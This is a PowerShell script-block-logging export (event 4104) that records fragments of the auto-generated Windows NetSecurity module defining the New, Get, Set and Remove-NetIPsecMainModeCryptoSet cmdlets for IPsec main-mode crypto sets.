          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('MaxSessions')) {
            [object]$__cmdletization_value = ${MaxSessions}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaxLifetimeSessions'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaxLifetimeSessions'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('ForceDiffieHellman')) {
            [object]$__cmdletization_value = ${ForceDiffieHellman}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceDiffieHellman'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceDiffieHellman'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecMainModeCryptoSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetIPsecMainModeCryptoSet' -Alias '*'
        

function Remove-NetIPsecMainModeCryptoSet
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEMMCryptoSet')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [uint32[]]
    ${MaxMinutes},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [uint32[]]
    ${MaxSessions},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${ForceDiffieHellman},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetMainModeRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecMainModeRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetIKEMMCryptoSet')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasB

ScriptBlock ID: f25ca2f5-ae99-46ae-ade0-bcd1dbfae1dc
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (2 of 6):
idateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [uint32[]]
    ${MaxMinutes},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [uint32[]]
    ${MaxSessions},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${ForceDiffieHellman},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetMainModeRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecMainModeRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('MaxMinutes') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${MaxMinutes})
        $__cmdletization_queryBuilder.FilterByProperty('MaxLifetimeMinutes', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('MaxSessions') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${MaxSessions})
        $__cmdletization_queryBuilder.FilterByProperty('MaxLifetimeSessions', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('ForceDiffieHellman') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${ForceDiffieHellman})
        $__cmdletization_queryBuilder.FilterByProperty('ForceDiffieHellman', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecMainModeRule') -and (@('ByAssociatedNetIPsecMainModeRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecMainModeRule}, 'MSFT_NetMainModeRuleMMCryptoSet', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecMainModeCryptoSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetIPsecMainModeCryptoSet' -Alias '*'
        

function Set-NetIPsecMainModeCryptoSet
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEMMCryptoSet')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByDisplayGroup', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByGroup', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetIKEMMCryptoSet')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewDisplayName},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${Description},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [ciminstance[]]
    ${Proposal},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [uint32]
    ${MaxMinutes},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [uint32]
    ${MaxSessions},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [bool]
    ${ForceDiffieHellman},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($

ScriptBlock ID: f25ca2f5-ae99-46ae-ade0-bcd1dbfae1dc
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (1 of 6):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetIKEMMCryptoSet'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function New-NetIPsecMainModeCryptoSet
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('ID')]
    [string]
    ${Name},

    [Parameter(ParameterSetName='cim:CreateInstance0', Mandatory=$true)]
    [string]
    ${DisplayName},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Description},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Group},

    [Parameter(ParameterSetName='cim:CreateInstance0', Mandatory=$true)]
    [ciminstance[]]
    ${Proposal},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [uint32]
    ${MaxMinutes},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [uint32]
    ${MaxSessions},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [bool]
    ${ForceDiffieHellman},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [switch]
    ${Default},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PolicyStore')) {
          [object]$__cmdletization_value = ${PolicyStore}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('GPOSession')) {
          [object]$__cmdletization_value = ${GPOSession}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Name')) {
          [object]$__cmdletization_value = ${Name}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InstanceID'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InstanceID'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisplayName')) {
          [object]$__cmdletization_value = ${DisplayName}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
